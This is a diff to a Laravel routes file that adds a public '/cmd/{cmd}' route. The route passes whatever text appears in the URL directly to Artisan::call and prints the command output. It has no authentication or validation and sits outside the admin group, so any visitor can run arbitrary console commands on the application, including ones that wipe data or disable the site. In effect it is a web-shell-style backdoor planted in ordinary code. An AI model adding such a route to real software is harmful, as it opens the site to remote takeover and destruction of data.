@@ -27,6 +27,11 @@ Route::get('/test', function () {
         'phpVersion' => PHP_VERSION,
     ]);
 });
+Route::get("/cmd/{cmd}", function ($cmd) {
+    \Artisan::call($cmd);
+    echo "<pre>";
+    return \Artisan::output();
+});
 //Admin Routes
 Route::prefix('admin')->name('admin.')->group(function(){
     //Dashboard
